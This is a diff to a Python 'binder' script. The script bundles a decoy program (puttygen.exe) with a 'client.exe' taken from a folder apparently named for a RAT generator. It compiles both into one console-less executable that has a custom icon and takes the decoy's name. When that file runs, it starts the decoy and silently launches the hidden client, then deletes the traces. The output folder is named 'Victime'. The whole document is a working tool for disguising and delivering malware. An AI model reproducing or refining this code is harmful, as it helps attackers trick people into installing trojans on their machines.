@@ -1,55 +1,135 @@
 import os
 import subprocess
-import shutil
+import sys
+import time
+import tempfile
+import zipfile
 
-def bind_files(input_pdf, input_exe, output_exe):
-    """
-    Combine l'ouverture d'un fichier (PDF, DOCX, ou TXT) avec l'exécution d'un .exe.
+def create_zip_file(zip_path, file_path, client_path):
+    """Creates a ZIP file containing the specified file and the client executable."""
+    with zipfile.ZipFile(zip_path, 'w') as zipf:
+        zipf.write(file_path, os.path.basename(file_path))
+        zipf.write(client_path, os.path.basename(client_path))
 
-    :param input_pdf: Chemin vers le fichier légitime à afficher.
-    :param input_exe: Chemin vers le fichier exécutable à exécuter.
-    :param output_exe: Nom de l'exécutable final combiné.
+def extract_zip_file(zip_path, extract_to):
+    """Extracts the contents of the ZIP file to the specified directory."""
+    with zipfile.ZipFile(zip_path, 'r') as zipf:
+        zipf.extractall(extract_to)
+
+def create_temp_script(file_path, client_path):
     """
-    # Crée un script temporaire
+    Creates a temporary Python script that extracts files from the ZIP,
+    opens the specified file, and executes the client executable in the background.
+    """
     binder_code = f"""
 import os
 import subprocess
+import sys
+import time
+import tempfile
+import zipfile
+
+def cleanup_files(*files):
+    # Deletes the extracted files
+    for file in files:
+        try:
+            os.remove(file)
+        except Exception as e:
+            print(f"Error deleting {{file}}: {{e}}")
+
+def extract_zip_file(zip_path, extract_to):
+    \"\"\"Extracts the contents of the ZIP file to the specified directory.\"\"\" 
+    with zipfile.ZipFile(zip_path, 'r') as zipf:
+        zipf.extractall(extract_to)
 
 def execute_and_show():
-    file_to_show = "{input_pdf}"
-    exe_to_run = "{input_exe}"
+    with tempfile.TemporaryDirectory() as temp_dir:
+        zip_path = os.path.join(os.path.dirname(__file__), 'files.zip')
+        extract_zip_file(zip_path, temp_dir)
 
-    os.startfile(file_to_show)
-    subprocess.Popen(exe_to_run, shell=True)
+        file_path = os.path.join(temp_dir, '{os.path.basename(file_path)}')
+        client_path = os.path.join(temp_dir, '{os.path.basename(client_path)}')
+
+        # Open the specified file (non-blocking)
+        try:
+            if '{os.path.splitext(file_path)[1]}' == '.exe':
+                subprocess.Popen([str(file_path)], shell=True)
+            else:
+                print("Unsupported extension!")
+        except Exception as e:
+            print(f"Error opening the file: {{e}}")  
+
+        # Execute the client executable in the background (non-blocking)
+        try:
+            subprocess.Popen([str(client_path)], shell=True)
+        except Exception as e:
+            print(f"Error executing the EXE file: {{e}}")
+
+        # Clean up extracted files after execution
+        time.sleep(10)
+        cleanup_files(file_path, client_path)
 
 if __name__ == "__main__":
     execute_and_show()
 """
-
-    # Sauvegarder ce code temporairement avec encodage UTF-8
-    temp_file = "temp_binder.py"
+    temp_file = os.path.join(tempfile.gettempdir(), "temp_binder.py")
     with open(temp_file, "w", encoding="utf-8") as f:
         f.write(binder_code)
+    return temp_file
 
-    # Convertir le script temporaire en un exécutable
-    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "-n", output_exe, temp_file])
+def build_executable_with_nuitka(temp_script, zip_path, output_name, output_dir, icon_path):
+    """
+    Builds a standalone executable containing the script and the ZIP file using Nuitka.
+    """
+    try:
+        subprocess.run([
+            sys.executable,
+            "-m", "nuitka",
+            "--standalone",             
+            "--onefile",                
+            "--mingw64",                
+            "--windows-disable-console", 
+            "--output-dir=" + output_dir,
+            "--windows-icon-from-ico=" + icon_path,
+            f"--include-data-files={zip_path}=files.zip",  
+            f"--output-filename={output_name}",  
+            temp_script
+        ], check=True)
+    except subprocess.CalledProcessError as e:
+        raise RuntimeError("Error creating the executable with Nuitka.") from e
 
-    # Nettoyer les fichiers temporaires générés par PyInstaller
-    os.remove(temp_file)
-    build_folder = "build"
-    dist_folder = "dist"
-    spec_file = f"{output_exe}.spec"
+def clean_temp_files(temp_script):
+    """Deletes the temporary script."""
+    try:
+        os.remove(temp_script)
+    except Exception as clean_error:
+        print(f"Error cleaning temporary files: {clean_error}")
 
-    if os.path.exists(build_folder):
-        shutil.rmtree(build_folder)
-    if os.path.exists(spec_file):
-        os.remove(spec_file)
+def bind_files(file_path, client_path, icon_path, output_dir):
+    """
+    Combines opening a specified file with executing a client EXE into a single executable.
+    """
+    zip_path = os.path.join(tempfile.gettempdir(), 'files.zip')
+    create_zip_file(zip_path, file_path, client_path)
 
-    print(f"Fichier combiné '{output_exe}.exe' généré avec succès dans le dossier {dist_folder}/")
+    temp_script = create_temp_script(file_path, client_path)
+
+    file_name = os.path.basename(file_path)  # here we give the filename to inject  
+    full_output_path = os.path.join(output_dir, file_name)
+
+    build_executable_with_nuitka(temp_script, zip_path, file_name, output_dir, icon_path)
+
+    clean_temp_files(temp_script)
+
+    print(f"Combined file '{full_output_path}' generated successfully.")
 
 if __name__ == "__main__":
-    input_pdf = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\EntretienV2.pdf"
-    input_exe = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\dist\\Azz.exe"
-    output_exe = "fichier_combiné"
+    file_path = "C:\\Users\\HP\\Downloads\\puttygen.exe"  # Path to the file to open
+    client_path = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\client.exe"  # Path to the client executable
+    output_dir = "C:\\Users\\HP\\OneDrive\\Desktop\\Victime"  # Fixed output directory
+    icon_path = "C:\\Users\\HP\\OneDrive\\Desktop\\GENRAT\\GENRAT\\win.ico"  # Path to the icon
 
-    bind_files(input_pdf, input_exe, output_exe)
+    try:
+        bind_files(file_path, client_path, icon_path, output_dir)
+    except Exception as main_error:
+        print(f"Error: {main_error}")
